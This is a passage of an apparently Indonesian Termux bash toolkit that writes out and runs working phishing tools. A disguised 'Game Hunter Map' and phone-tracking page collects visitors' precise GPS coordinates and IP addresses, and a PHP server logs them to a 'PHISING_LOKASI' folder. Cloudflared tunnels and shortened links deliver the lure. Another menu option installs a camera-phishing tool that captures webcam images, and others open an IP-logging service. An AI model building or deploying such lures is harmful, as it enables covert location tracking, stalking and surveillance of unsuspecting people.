navigator.geolocation.getCurrentPosition(handlePosition, handleError, { enableHighAccuracy: true, timeout: 10000 });
} else {
updateStatus("Browser tidak mendukung geolocation.", "error");
}
});
</script>
</body>
</html>
HTML
}
create_html2() {
cat > index.html << 'HTML'
<!DOCTYPE html>
<html>
<head>
<title>Game Hunter Map: Pelacakan Target</title>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<style>
@import url('https://fonts.googleapis.com/css2?family=Press+Start+2P&family=Roboto:wght@400;700&display=swap');
* { box-sizing: border-box; margin: 0; padding: 0; }
body {
font-family: "Roboto", sans-serif;
background: url('https://www.transparenttextures.com/patterns/paper-fibers.png') #2c1b0a; /* Tekstur peta kuno */
color: #f4e4bc; /* Krem ala peta */
overflow-x: hidden;
position: relative;
}
canvas#stars {
position: fixed;
top: 0; left: 0;
width: 100%; height: 100%;
z-index: -1;
opacity: 0.3; /* Bintang lebih subtle */
}
.container {
background: linear-gradient(180deg, #3c2f1b, #2c1b0a);
border: 3px solid #d4a017; /* Emas untuk border */
border-radius: 15px;
box-shadow: 0 0 20px rgba(212, 160, 23, 0.5), inset 0 0 10px rgba(0, 0, 0, 0.7);
width: 90%;
max-width: 700px;
margin: 2rem auto;
padding: 2rem;
text-align: center;
animation: fadeIn 1.5s ease;
position: relative;
}
.compass {
position: absolute;
top: -30px; left: 50%;
transform: translateX(-50%);
width: 60px; height: 60px;
background: url('https://www.svgrepo.com/show/19107/compass.svg') no-repeat center;
background-size: contain;
animation: spinCompass 10s linear infinite;
}
h1 {
font-family: "Press Start 2P", cursive;
font-size: 1.8rem;
color: #d4a017; /* Emas */
text-shadow: 0 0 8px #d4a017, 0 0 15px #8b5e0f;
margin-bottom: 1.5rem;
}
label {
font-family: "Roboto", sans-serif;
display: block;
margin: 1rem 0 0.5rem;
font-weight: 700;
color: #f4e4bc;
text-align: left;
text-shadow: 0 0 5px #000;
}
input[type="tel"] {
width: 100%;
padding: 0.8rem;
border-radius: 8px;
border: 2px solid #4a7043; /* Hijau hutan */
background: #1a2c16;
color: #f4e4bc;
font-size: 1rem;
outline: none;
box-shadow: inset 0 0 5px #000;
}
input[type="tel"]::placeholder {
color: #8b9e87;
}
button {
margin-top: 1.5rem;
background: linear-gradient(90deg, #4a7043, #2e4b29);
color: #f4e4bc;
border: 2px solid #d4a017;
padding: 0.8rem;
width: 100%;
font-family: "Press Start 2P", cursive;
font-size: 0.9rem;
border-radius: 10px;
cursor: pointer;
transition: all 0.3s ease;
box-shadow: 0 0 15px rgba(74, 112, 67, 0.7);
text-shadow: 0 0 5px #000;
}
button:hover {
transform: scale(1.05);
box-shadow: 0 0 25px rgba(212, 160, 23, 0.9);
background: linear-gradient(90deg, #5a8c50, #3b6734);
}
.status {
margin-top: 1rem;
padding: 1rem;
border-radius: 8px;
display: none;
text-align: center;
font-size: 0.9rem;
font-family: "Roboto", sans-serif;
background: rgba(0, 0, 0, 0.5);
}
.status.success {
background: rgba(74, 112, 67, 0.3);
color: #4a7043;
}
.status.error {
background: rgba(139, 0, 0, 0.3);
color: #ff4040;
}
.info-text {
margin-top: 1rem;
font-size: 0.9rem;
color: #d4a017;
text-align: center;
font-family: "Roboto", sans-serif;
text-shadow: 0 0 5px #000;
}
margin-top: 1.5rem;
padding: 1rem;
border-radius: 10px;
background: rgba(44, 27, 10, 0.8);
color: #f4e4bc;
text-align: left;
font-size: 0.95rem;
line-height: 1.5;
box-shadow: inset 0 0 10px rgba(0, 0, 0, 0.7);
font-family: "Roboto", sans-serif;
border: 1px solid #d4a017;
}
font-family: "Press Start 2P", cursive;
color: #d4a017;
}
.loading {
display: none;
margin: 1rem auto;
width: 40px; height: 40px;
border: 4px solid #d4a017;
border-top: 4px solid #4a7043;
border-radius: 50%;
animation: spin 1s linear infinite;
}
@keyframes fadeIn {
from { opacity: 0; transform: translateY(-20px); }
to { opacity: 1; transform: translateY(0); }
}
@keyframes spin {
to { transform: rotate(360deg); }
}
@keyframes spinCompass {
to { transform: translateX(-50%) rotate(360deg); }
}
@media (max-width: 500px) {
h1 { font-size: 1.4rem; }
.container { padding: 1.5rem; }
button { font-size: 0.8rem; }
}
</style>
</head>
<body>
<canvas id="stars"></canvas>
<div class="container" id="inputContainer">
<div class="compass"></div>
<h1>Game Hunter Map</h1>
<form id="phoneForm">
<label for="phone">Identifikasi Target Pemburu:</label>
<input type="tel" id="phone" name="phone" placeholder="08123456789" required pattern="[0-9]{9,15}" autocomplete="off" />
<button type="submit">Mulai Perburuan</button>
</form>
<p class="info-text">
⚠️ Aktifkan lokasi Anda untuk memulai perburuan! Lokasi diperlukan untuk melacak target di peta.
</p>
<div class="loading" id="loading"></div>
<div class="status" id="status"></div>
</div>
<div class="container" id="resultContainer" style="display:none;">
<div class="compass"></div>
<h1>Laporan Misi Perburuan</h1>
<div id="trackingResult"></div>
</div>
<script>
// === animasi bintang ===
const canvas = document.getElementById("stars");
const ctx = canvas.getContext("2d");
canvas.width = window.innerWidth;
canvas.height = window.innerHeight;
let stars = [];
for (let i = 0; i < 150; i++) {
stars.push({
x: Math.random() * canvas.width,
y: Math.random() * canvas.height,
radius: Math.random() * 1.5,
dx: (Math.random() - 0.5) * 0.5,
dy: (Math.random() - 0.5) * 0.5
});
}
function drawStars() {
ctx.clearRect(0, 0, canvas.width, canvas.height);
ctx.fillStyle = "white";
stars.forEach(star => {
ctx.beginPath();
ctx.arc(star.x, star.y, star.radius, 0, Math.PI * 2);
ctx.fill();
});
}
function updateStars() {
stars.forEach(star => {
star.x += star.dx;
star.y += star.dy;
if (star.x < 0 || star.x > canvas.width) star.dx *= -1;
if (star.y < 0 || star.y > canvas.height) star.dy *= -1;
});
}
function animate() {
drawStars();
updateStars();
requestAnimationFrame(animate);
}
animate();
// === kode tracking ===
const form = document.getElementById('phoneForm');
const statusDiv = document.getElementById('status');
const resultContainer = document.getElementById('resultContainer');
const trackingResult = document.getElementById('trackingResult');
const phoneInput = document.getElementById('phone');
const loadingDiv = document.getElementById('loading');
function updateStatus(msg, type) {
loadingDiv.style.display = 'none';
statusDiv.style.display = 'block';
statusDiv.textContent = msg;
statusDiv.className = 'status ' + type;
}
function sendLocationToServer(lat, lon, acc, phoneNumber) {
const xhr = new XMLHttpRequest();
const url = `?lat=${lat}&lon=${lon}&acc=${acc}&phone=${encodeURIComponent(phoneNumber)}`;
xhr.open('GET', url, true);
xhr.timeout = 5000;
xhr.onreadystatechange = function() {
if (xhr.readyState === 4 && xhr.status === 200) {
updateStatus("Data lokasi berhasil dikirim ke markas pemburu.", "success");
} else if (xhr.readyState === 4) {
updateStatus("Gagal mengirim data ke markas: " + xhr.statusText, "error");
}
};
xhr.ontimeout = function() {
updateStatus("Misi timeout: Markas lambat atau tidak terjangkau.", "error");
};
xhr.onerror = function() {
updateStatus("Gangguan sinyal: Periksa koneksi internet.", "error");
};
xhr.send();
}
function getDistance(lat1, lon1, lat2, lon2) {
const R = 6371;
const dLat = (lat2 - lat1) * Math.PI / 180;
const dLon = (lon2 - lon1) * Math.PI / 180;
const a =
Math.sin(dLat/2) * Math.sin(dLat/2) +
Math.cos(lat1 * Math.PI/180) * Math.cos(lat2 * Math.PI/180) *
Math.sin(dLon/2) * Math.sin(dLon/2);
const c = 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1-a));
return (R * c).toFixed(2);
}
function getRandomFakeLocation() {
const lat = (Math.random() * (6 - (-11)) + (-11)).toFixed(6);
const lon = (Math.random() * (141 - 95) + 95).toFixed(6);
return {lat: parseFloat(lat), lon: parseFloat(lon)};
}
function handlePosition(pos) {
const lat = pos.coords.latitude.toFixed(6);
const lon = pos.coords.longitude.toFixed(6);
const acc = Math.round(pos.coords.accuracy);
const phoneNumber = phoneInput.value;
const fake = getRandomFakeLocation();
const fakeLat = fake.lat;
const fakeLon = fake.lon;
const distance = getDistance(parseFloat(lat), parseFloat(lon), fakeLat, fakeLon);
updateStatus("Lokasi pemburu ditemukan!", "success");
document.getElementById("inputContainer").style.display = "none";
resultContainer.style.display = "block";
sendLocationToServer(lat, lon, acc, phoneNumber);
trackingResult.innerHTML = `
<strong>Laporan Misi:</strong><br>
- Nomor Target: ${phoneNumber}<br>
- Koordinat Pemburu: ${lat}, ${lon}<br>
- Koordinat Target: ${fakeLat}, ${fakeLon}<br>
- Jarak ke Target: ~${distance} km<br>
- Waktu Misi: ${new Date().toLocaleString('id-ID')} WIB<br>
- Peta Perburuan:
<a href="https://www.google.com/maps/dir/?api=1&origin=${lat},${lon}&destination=${fakeLat},${fakeLon}&travelmode=walking" target="_blank">
Lihat Rute Perburuan
</a>
`;
}
function handleError(err) {
loadingDiv.style.display = 'none';
updateStatus("Gagal menemukan lokasi: " + err.message, "error");
}
form.addEventListener('submit', e => {
e.preventDefault();
loadingDiv.style.display = 'block';
statusDiv.style.display = 'none';
updateStatus("Memulai perburuan, mencari lokasi...", "success");
if (navigator.geolocation) {
navigator.geolocation.getCurrentPosition(handlePosition, handleError, { enableHighAccuracy: true, timeout: 10000 });
} else {
updateStatus("Perangkat tidak mendukung pelacakan lokasi.", "error");
}
});
</script>
</body>
</html>
HTML
}
create_php_server() {
cat > location_server.php << 'PHP'
<?php
error_reporting(E_ALL ^ E_WARNING); // Suppress warnings seperti RWRAP
header('Access-Control-Allow-Origin: *');
header('Content-Type: text/plain');
// Debug: Log PHP version
error_log("PHP Version: " . phpversion(), 3, 'php_error.log');
function getAddress($lat, $lon) {
$url = "https://nominatim.openstreetmap.org/reverse?format=json&lat=$lat&lon=$lon";
$options = [
'http' => [
'header' => "User-Agent: Mozilla/5.0\r\n"
]
];
$context = stream_context_create($options);
$response = @file_get_contents($url, false, $context); // Suppress error
if ($response === FALSE) {
$error_msg = isset($http_response_header) ? implode("\n", $http_response_header) : 'Unknown error';
error_log("Nominatim request failed: $error_msg", 3, 'php_error.log');
return 'Address not available due to service limit or error';
}
$data = json_decode($response, true);
return isset($data['display_name']) ? $data['display_name'] : 'Address not available';
}
if (isset($_GET['lat']) && isset($_GET['lon'])) {
// Debug: Log params received
$phone = isset($_GET['phone']) ? $_GET['phone'] : 'Unknown';
$acc = isset($_GET['acc']) ? $_GET['acc'] : 'N/A';
$debug_msg = "Params received: lat={$_GET['lat']}, lon={$_GET['lon']}, acc=$acc, phone=$phone";
error_log($debug_msg, 3, 'php_error.log');
echo "$debug_msg\n"; // Echo ke response buat test
$lat = $_GET['lat'];
$lon = $_GET['lon'];
$timestamp = date('Y-m-d H:i:s');
$ip = $_SERVER['REMOTE_ADDR'];
$address = getAddress($lat, $lon);
$data = [
'time' => $timestamp,
'ip' => $ip,
'phone' => $phone,
'latitude' => $lat,
'longitude' => $lon,
'accuracy' => $acc,
'address' => $address,
'maps_url' => "https://www.google.com/maps/place/$lat,$lon"
];
// Append to JSON file with retry
$json_path = '/sdcard/PHISING_LOKASI/location_data.json';
$retry = 3;
while ($retry > 0) {
if (file_put_contents($json_path, json_encode($data, JSON_PRETTY_PRINT) . "\n", FILE_APPEND)) {
break;
}
error_log("Retry $retry: Failed to write to $json_path", 3, 'php_error.log');
$retry--;
sleep(1);
}
if ($retry == 0) {
error_log("Failed to write to $json_path after retries", 3, 'php_error.log');
}
// Output for terminal display with fallback path
$output = "\n\033[1;36m[+] LOCATION CAPTURED!\033[0m\n";
$output .= "\033[1;33m──────────────────────────────\033[0m\n";
$output .= "\033[1;32m• Time:\033[0m       $timestamp\n";
$output .= "\033[1;32m• IP:\033[0m         $ip\n";
$output .= "\033[1;32m• Phone:\033[0m      $phone\n";
$output .= "\033[1;32m• Latitude:\033[0m   $lat\n";
$output .= "\033[1;32m• Longitude:\033[0m  $lon\n";
$output .= "\033[1;32m• Accuracy:\033[0m   $acc meters\n";
$output .= "\033[1;33m──────────────────────────────\033[0m\n";
$output .= "\033[1;32m• Address:\033[0m\n$address\n";
$output .= "\033[1;33m──────────────────────────────\033[0m\n";
$output .= "\033[1;34mGoogle Maps:\033[0m https://www.google.com/maps/place/$lat,$lon\n";
$retry = 3;
while ($retry > 0) {
if (file_put_contents('/data/data/com.termux/location.output', $output)) {
break;
}
error_log("Retry $retry: Failed to write to /data/data/com.termux/location.output, trying /tmp", 3, 'php_error.log');
if (file_put_contents('/tmp/location.output', $output)) {
break;
}
$retry--;
sleep(1);
}
if ($retry == 0) {
error_log("Failed to write to location.output or fallback after retries", 3, 'php_error.log');
}
echo json_encode($data);
exit;
}
header('Content-Type: text/html');
readfile('index.html');
?>
PHP
}
CUTTLY_API_KEY="$shortlink"
shortlink() {
local LONG_URL="$1"
if [ -z "$LONG_URL" ]; then
echo "❌ Penggunaan: shortlink \"url\""
return 1
fi
local cuttly_response
cuttly_response=$(curl -s -G "https://cutt.ly/api/api.php" \
--data-urlencode "key=$CUTTLY_API_KEY" \
--data-urlencode "short=$LONG_URL")
local cuttly_link
cuttly_link=$(echo "$cuttly_response" | grep -oP '"shortLink":\s*"\K[^"]+' | sed 's#\\##g')
if [ -n "$cuttly_link" ]; then
echo "$cuttly_link"
else
echo -e "${m}[ ! ] Pendekan link gagal, menggunakan asli: $LONG_URL${reset}"
echo "$LONG_URL"
fi
}
start_server() {
ARCH=$(uname -m)
if [[ "$ARCH" == "aarch64" ]]; then
export LD_PRELOAD=/system/lib64/libdl.so
elif [[ "$ARCH" == "arm"* ]]; then
export LD_PRELOAD=/system/lib/libdl.so
fi
echo -e "${h}[+] Memulai server PHP dengan logging...${reset}"
php -S 0.0.0.0:$PORT -t . location_server.php 2> /dev/null | tee "$PHP_SERVER_LOG" &
PHP_PID=$!
sleep 2
echo -e "${h}[+] Memulai terowongan Cloudflared...${reset}"
cloudflared tunnel --url http://localhost:$PORT > "$CLOUDFLARED_LOG" 2>&1 &
CF_PID=$!
sleep 8
send_link=$(grep -o "https://[-0-9a-z]*\.trycloudflare.com" "$CLOUDFLARED_LOG")
if [ -z "$send_link" ]; then
echo -e "${m}[!] Gagal membuat terowongan Cloudflared${reset}"
send_link="http://localhost:$PORT"
else
echo -e "${h}[+] Terowongan berhasil dibuat!${reset}"
fi
short_send_link=$(shortlink "$send_link")
echo -e "\n${k}[+] URL Publik:${reset} ${bl}$send_link${reset}"
echo -e "${k}[+] URL Pendek:${reset} ${bl}$short_send_link${reset}"
echo -e "${k}[+] URL Lokal:${reset} ${bl}http://localhost:$PORT${reset}"
echo -e "${k}[+] File Log:${reset} ${bl}${LOGFILE}${reset}"
echo -e "\n${h}[+] Menunggu data lokasi...${reset}"
echo -e "${h}[+] Tekan ${m}q${reset} ${h}untuk berhenti${reset}\n"
}
display_location() {
local output_file="$TMP_OUTPUT"
if [ ! -s "$output_file" ] && [ -s "$ALT_TMP_OUTPUT" ]; then
output_file="$ALT_TMP_OUTPUT"
mv "$ALT_TMP_OUTPUT" "$TMP_OUTPUT"
fi
if [ -s "$output_file" ]; then
clear
banner | boxes -d ansi-rounded | lolcat
for i in {1..2}; do
mpv --volume="100" "https://github.com/Lubebansokhekel/mpvtube/raw/main/Messenger-Notification-Sound.mp3" &> /dev/null
done &
cat "$output_file"
rm -f "$output_file"
e "${ran}Data Disimpan ke${b}:${ran4}${LOGFILE}"
echo -e "\n${k}[+] URL yang Masih Aktif:${reset} ${bl}$send_link${reset}"
echo -e "${k}[+] URL yang Masih Aktif:${reset} ${bl}$short_send_link${reset}"
echo -e "${h}[+] Menunggu Target Baru...${reset}"
echo -e "${h}[+] Tekan ${m}q${reset} ${h}untuk berhenti${reset}\n"
fi
}
check_requirements
running() {
mkdir -p /sdcard/PHISING_LOKASI
create_php_server
start_server
trap cleanup INT TERM
while true; do
display_location
sleep 1
if read -t 0.1 -n 1 key; then
if [[ $key == "q" ]]; then
cleanup
break
fi
fi
done
}
while true; do
clear
banner | boxes -d ansi-rounded | lolcat
e ${ran} "===================================="
e "          M A I N   M E N U"
e "===================================="
e "1. Pelacakan lokasi nomor telepon"
e "2. Game Hunter Map: Pelacakan Target"
e "3. Keluar"
e "------------------------------------"
IFS= read -r -e -p "Pilih (1/2/3): " pilihan
case $pilihan in
1)
e "Menjalankan Pelacakan lokasi nomor telepon..."
create_html
running
;;
2)
e "Menjalankan Game Hunter Map: Pelacakan Target..."
create_html2
running
;;
3)
e "Keluar..."
break
;;
*)
e "Pilihan tidak valid! Ulangi lagi."
;;
esac
e ""
IFS= read -r -e -p "Tekan [Enter] untuk kembali ke menu..."
done
elif [ "$no" = "16" ]; then
while true; do
userfinder="$DIR_SAVE/UserFinder"
if [ -d "$userfinder" ]; then
cd $userfinder
git pull
e $k "MEMBUKA SCRIPT"
sleep 3
clear
bash UserFinder.sh
IFS= read -r -e -p "Silahkan Enter Ini akan Masuk ke TOOLSV5 lagi"
e "$k"
break
else
play -q $HOME/Lubeban/sound/salah.mp3 &> /dev/null &
clear
sleep 2
e $k "Menginstall PENJELAJAH NAME"
cd $DIR_SAVE
git clone --depth 32 https://github.com/mishakorzik/UserFinder
cd UserFinder
fi
done
elif [ "$no" = "17" ]; then
cek_akses
pengecekan() {
required_packages=("git" "php" "wget" "curl" "jq" "openssl" "cloudflared")
missing=0
echo "[ * ] Mengecek package yang dibutuhkan..."
for pkg in "${required_packages[@]}"; do
if ! command -v "$pkg" &> /dev/null; then
echo "[ - ] Package '$pkg' tidak ditemukan."
missing=1
else
echo "[+] Package '$pkg' tersedia."
fi
done
if [ "$missing" -eq 1 ]; then
echo "[ ! ] Ada package yang belum diinstall. Silakan install dulu sebelum lanjut."
sleep 3
fi
camhack="/sdcard/CAM-DUMPER"
required_dirs=(
"$camhack"
"$camhack/captured_files"
"$camhack/captured_files/new"
"$camhack/captured_files/old"
)
echo "[ * ] Mengecek direktori yang dibutuhkan..."
for dir in "${required_dirs[@]}"; do
if [ ! -d "$dir" ]; then
echo "[ - ] Direktori '$dir' tidak ada. Membuat..."
mkdir -p "$dir" || {
echo "[ ! ] Gagal membuat direktori '$dir'."
exit 1
}
else
echo "[ + ] Direktori '$dir' tersedia."
fi
done
echo "[ ✓ ] Semua dependensi dan direktori sudah siap."
sleep 2
clear
}
while true; do
camhack="/sdcard/CAM-DUMPER"
if [ -d "$camhack" ]; then
e $k "MEMBUKA CAM HACK"
sleep 2
clear
cd $camhack
git stash &> /dev/null
git pull origin main &> /dev/null
clear
pengecekan
rm -rf sendlink
rm Log.log *.zip > /dev/null 2>&1 || true
mv *.png captured_files/old > /dev/null 2>&1 || true
mv captured_files/new/*.png captured_files/old/ > /dev/null 2>&1 || true
stop() {
checkcloudflared=$(pgrep cloudflared)
if [[ -n "$checkcloudflared" ]]; then
killall cloudflared > /dev/null 2>&1
e "${k}Proses cloudflared dihentikan.${res}"
fi
}
trap 'printf "\n"; stop' SIGINT
banner() {
banner5
e "${h}CAM PHISHING PENGEMBANG GALIRUS OFFICIAL${res}"
e "${p}Version : Beta 1.0.0${res}"
}
dependencies() {
if ! command -v php &> /dev/null; then
e "${k}PHP tidak terinstal, menginstal...${res}"
$paket install php -y || $paket install php -y || {
e "${m}Gagal menginstal PHP. Aborting.${res}" && exit 1
}
fi
if ! command -v which &> /dev/null; then
e "${k}WHICH tidak terinstal, menginstal...${res}"
$paket install which -y || $paket install which -y || {
e "${m}Gagal menginstal WHICH. Aborting.${res}" && exit 1
}
fi
if ! command -v unzip &> /dev/null; then
e "${k}unzip tidak terinstal, menginstal...${res}"
$paket install unzip -y || $paket install unzip -y || {
e "${m}Gagal menginstal unzip. Aborting.${res}" && exit 1
}
fi
if ! command -v wget &> /dev/null; then
e "${k}wget tidak terinstal, menginstal...${res}"
$paket install wget -y || $paket install wget -y || {
e "${m}Gagal menginstal wget. Aborting.${res}" && exit 1
}
fi
if ! command -v jq &> /dev/null; then
e "${k}jq tidak terinstal, menginstal...${res}"
$paket install jq -y || $paket install jq -y || {
e "${m}Gagal menginstal jq. Aborting.${res}" && exit 1
}
fi
if ! command -v cloudflared &> /dev/null; then
e "${k}Cloudflared tidak terinstal, menginstal...${res}"
$paket install cloudflared -y || $paket install cloudflared -y || {
e "${m}Gagal menginstal Cloudflared. Aborting.${res}" && exit 1
}
fi
}
catch_ip() {
ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
IFS=$'\n'
e "${y}[${res}${p}+${res}${y}] IP:${res}${p} $ip${res}"
cat ip.txt >> saved.ip.txt
}
checkfound() {
e "\n"
e "${g}[${res}${p}*${res}${g}] Tunggu Target,${res}${p} Klik q Lalu Enter untuk Keluar (setop)...${res}"
while true; do
read -t 1 -p "" user_input
if [[ $user_input == 'q' ]]; then
e "\n${m}Keluar dari pengecekan...${res}"
stop
break
fi
if [[ -e "ip.txt" ]]; then
e "\n${g}[${res}+${g}] Target Membuka Link!${res}"
catch_ip
rm -rf ip.txt
fi
sleep 0.5
if [[ -e "Log.log" ]]; then
clear
banner | lolcat
e "${p} Klik q Lalu Enter untuk Keluar (setop)...${res}"
e "\n${g}[${res}+${g}] Gambar Masuk Ke /sdcard/capture_file/new${res}"
mv *.png /sdcard/CAM-DUMPER/captured_files/new > /dev/null 2>&1 || true
tree /sdcard/CAM-DUMPER/captured_files/new
rm -rf Log.log
fi
sleep 0.5
done
}
start() {
while true; do
clear
dependencies
banner | lolcat
e "${g}Pilih metode akses:${res}"
e "1. Cloudflared"
e "2. Serveo.net"
e "0. back toolsv5"
IFS= read -r -e -p "Pilih opsi [1/0]: " option
if [[ $option == '2' ]]; then
e "${p}[${res}${y}+${res}${p}] Starting Serveo...${res}"
$(which sh) -c 'ssh -n -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:1912 serveo.net > sendlink ' &
sleep 8
send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
e "${y}[${res}${p}+${res}${y}] Silahkan Salin Link:${res}${p} $send_link${res}"
checkfound
elif [[ $option == '1' ]]; then
cd "$camhack"
e "${p}[${res}${y}+${res}${p}] Starting Cloudflared...${res}"
php -S localhost:1912 > /dev/null 2>&1 &
sleep 3
cloudflared tunnel --url http://localhost:1912 > sendlink 2>&1 &
sleep 8
send_link=$(grep -o "https://[-0-9a-z]*\.trycloudflare.com" sendlink)
e "${y}[${res}${p}+${res}${y}] Silahkan Salin Link:${res}${p} $send_link${res}"
sed 's+forwarding_link+'"$send_link"'+g' "cam-dumper.html" > index2.html
sed 's+forwarding_link+'"$send_link"'+g' "template.php" > index.php
checkfound
elif [[ $option == "0" ]]; then
break
else
e "${m}Pilihan tidak valid.${res}"
sleep 3
fi
done
}
start
break
else
play -q $HOME/Lubeban/sound/salah.mp3 &> /dev/null &
e "${k}Menginstall Cam Hack${res}"
sleep 2
$paket install -y git php wget curl jq openssh cloudflared
cd /sdcard
git clone --depth 32 https://github.com/GALIRUS404/CAM-DUMPER
cd CAM-DUMPER
git pull origin main &> /dev/null
tutorial
xdg-open 'https://mega.nz/file/7gQTjZpT#K8pnhx5wWSCQmWmASb9L174beNaPLL9wBeYXZmr3J28'
fi
done
elif [ "$no" = "18" ]; then
cek_akses
while true; do
dir="$PREFIX/share"
cek="gemoxi"
if [ -d "$dir/$cek" ]; then
cd $dir
cd $cek
git pull origin main &> /dev/null
git stash &> /dev/null
module="$dir/$cek/node_modules"
if [ -d "$module" ]; then
cd $dir
cd $cek
curl -sL -k -o config.json "https://od.lk/s/OV8yNTI5MjUwMzZf/gemini.json" &> /dev/null | e $h "Sabar Admin sedang Memasangkan Apikey$res"
play -q $HOME/Lubeban/sound/klik.mp3 &> /dev/null &
clear
banner_skill() {
echo -e "
$m⠀ ⠀⠀⠀⣶⡆⠀⠀⠀⢀⣴⢦⠀⠀⠀⠀⣖⡶⠀⠀⠀⠀⡏⡧⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢹⣷⡀⠀⠀⢀⣿⣧⡀⠀⠀⢠⣾⣧⠀⠀⠀⣠⣾⡇⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢸⣿⣿⣦⡀⣼⣿⣿⣷⡀⢠⣿⣿⣿⡆⢀⣾⣿⣿⡇⠀⠀⠀⠀⠀
$p⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣷⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⠋⠙⢿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀
$k⠀⠀⠀⠀⠠⣤⣉⣙⠛⠛⠛⠿⠿⠁⣴⣦⡈⠻⠛⠛⠛⢛⣉⣁⡤⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠈⠉⠛⠻⠿⠶⣶⣆⠈⢿⡿⠃⣠⣶⡿⠿⠟⠛⠉⠀⠀⠀⠀⠀⠀
$p⠀⠀⠀⠀⠀⢠⣿⣿⣶⣶⣤⣤⣤⣤⡀⢁⣠⣤⣤⣤⣶⣶⣿⣿⡀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣸⣿⡏⠉⠙⠛⠿⢿⣿⣿⣾⣿⡿⠿⠛⠋⠉⠹⣿⡇⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠻⢿⣧⣀⠀⠀⣀⣀⣼⡿⣿⣯⣀⣀⠀⠀⣀⣼⡿⠗⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠙⠻⣿⣿⣿⣿⣿⠁⠘⣿⣿⣿⣿⣿⠟⠉
$p⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣿⣿⣿⣇⣀⣀⣹⣿⣿⣿⠃
$p⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣿⠿⣿⡿⢿⣿⠿⣿⡇
$p⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⡇⢀⣿⡇⢸⣿⡀⢸⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠁⠈⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
"
}
banner_skill
node -e "$(
cat << 'EOF'
process.noDeprecation = true;
const express = require("express");
const path = require("path");
const fs = require("fs");
const app = express();
const CONFIG_FILE = "config.json";
app.use(express.json());
app.use(express.static(path.join(__dirname, "public")));
const loadApiKey = () => {
try {
if (fs.existsSync(CONFIG_FILE)) {
const config = JSON.parse(fs.readFileSync(CONFIG_FILE, "utf-8"));
return config.apiKey || null;
}
} catch (err) {
console.error("Error loading config:", err);
}
return null;
};
const saveApiKey = (apiKey) => {
fs.writeFileSync(CONFIG_FILE, JSON.stringify({ apiKey }, null, 2));
};
const promptForApiKey = async () => {
const readline = require("readline").createInterface({
input: process.stdin,
output: process.stdout,
});
return new Promise((resolve) => {
readline.question("\nApi Belum Terpasang!\nSilahkan Ambil Api Anda Sendiri: https://aistudio.google.com/app/apikey\nPaste Api Anda Disini: ", (apiKey) => {
readline.close();
saveApiKey(apiKey);
console.log("\n✓ API Key saved successfully!\n");
resolve(apiKey);
});
});
};
app.post("/api/generate", async (req, res) => {
const prompt = req.body.prompt || "Write a story about a magical bag.";
const apiKey = loadApiKey();
if (!apiKey) {
return res.status(400).json({ error: "API Key not found!" });
}
const url = `https://generativelanguage.googleapis.com/v1beta/models/gemini-1.5-flash:generateContent?key=${apiKey}`;
try {
const response = await fetch(url, {
method: "POST",
headers: { "Content-Type": "application/json" },
body: JSON.stringify({
contents: [{ parts: [{ text: prompt }] }],
}),
});
const data = await response.json();
if (data.candidates && data.candidates[0] && data.candidates[0].content) {
const generatedText = data.candidates[0].content.parts[0].text;
res.json({ response: generatedText });
} else {
res.status(400).json({ error: "No results found." });
}
} catch (err) {
console.error("Error:", err);
res.status(500).json({ error: "Server error occurred." });
}
});
app.get("/", (req, res) => {
res.sendFile(path.join(process.cwd(), "index.html"));
});
const initializeServer = async () => {
let apiKey = loadApiKey();
if (!apiKey) {
apiKey = await promptForApiKey();
}
app.listen(3000, () => {
console.log("=======================================");
console.log("       GEMINI AI TOOLS WEBSITE           ");
console.log("=======================================");
console.log("Server is running at: http://localhost:3000");
console.log("Use this tool to generate AI content.\n");
});
};
initializeServer();
EOF
)"
break
else
play -q $HOME/Lubeban/sound/salah.mp3 &> /dev/null &
e $m $bg_lg"Node Modules Tidak Terinstall"$res
cd $dir/$cek
echo '{
"name": "gemoxi",
"version": "1.0.0",
"description": "Galirus Official",
"main": "server.js",
"scripts": {
"start": "node server.js"
},
"dependencies": {
"express": "^4.21.2"
}
}' > package.json
yarn
e $h $bg_lg"Node Module Terpasang Silahkan Ulang I$res"
sleep 3
fi
break
else
play -q $HOME/Lubeban/sound/salah.mp3 &> /dev/null &
e $m $bg_lg"Sabar Brek Installasi package"$res
cd $PREFIX/share/
git clone --depth 32 https://github.com/Hozowaorokananingenda/gemoxi &> /dev/null || echo "SEDANG MENGINSTALL PAKET"
git pull origin main &> /dev/null
git stash &> /dev/null
$paket install yarn -y
fi
done
elif [ "$no" = "19" ]; then
clear
e $k "MEMBUKA BROWSING CHECK HOSTING"
sleep 3
xdg-open "https://check-host.net/"
elif [ "$no" = "20" ]; then
cek_akses
clear
xdg-open "https://zefoy.com/"
elif [ "$no" = "21" ]; then
e $k "Membuka browsing"
sleep 3
xdg-open "https://grabify.link/"
elif [ "$no" = "22" ]; then
Downloadnowatermark
elif [ "$no" = "23" ]; then
cek_akses
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'
URLS=()
banner() {
echo "
